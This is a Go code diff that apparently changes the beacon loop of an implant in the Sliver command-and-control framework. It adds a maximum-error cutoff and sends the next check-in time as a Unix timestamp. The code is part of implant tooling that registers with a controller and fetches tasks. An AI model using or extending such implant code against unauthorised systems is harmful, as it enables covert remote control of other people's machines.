@@ -212,21 +212,21 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		log.Printf("Error starting beacon: %s", err)
 		// {{end}}
 		beaconErrors++
-		if beaconErrors < transports.GetMaxConnectionErrors() {
-			return nil
+		if transports.GetMaxConnectionErrors() < beaconErrors {
+			return err
 		}
-		return err
+		return nil
 	}
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
-	nextBeacon := beacon.Duration()
+	nextBeacon := time.Now().Add(beacon.Duration())
 	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          BeaconID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
 		Register:    RegisterSliver(),
-		NextCheckin: int64(nextBeacon),
+		NextCheckin: nextBeacon.UTC().Unix(),
 	}))
 	beacon.Close()
 
@@ -235,11 +235,17 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// BeaconMain - Is executed in it's own goroutine as the function will block
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
+	intervalErrors := 0
 	for {
-		nextBeacon = beacon.Duration()
+		if transports.GetMaxConnectionErrors() < intervalErrors {
+			break
+		}
+		duration := beacon.Duration()
+		nextBeacon = time.Now().Add(duration)
 		go func() {
 			err := beaconMain(beacon, nextBeacon)
 			if err != nil {
+				intervalErrors++
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] main %s", err)
 				// {{end}}
@@ -247,20 +253,21 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		}()
 
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep for %v", nextBeacon)
+		log.Printf("[beacon] sleep until %v", nextBeacon)
 		// {{end}}
-		time.Sleep(nextBeacon)
+		time.Sleep(duration)
 	}
+	return nil
 }
 
-func beaconMain(beacon *transports.Beacon, nextCheckin time.Duration) error {
+func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	err := beacon.Start()
 	if err != nil {
 		return err
 	}
 	err = beacon.Send(Envelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
 		ID:          BeaconID,
-		NextCheckin: int64(nextCheckin),
+		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	if err != nil {
 		return err
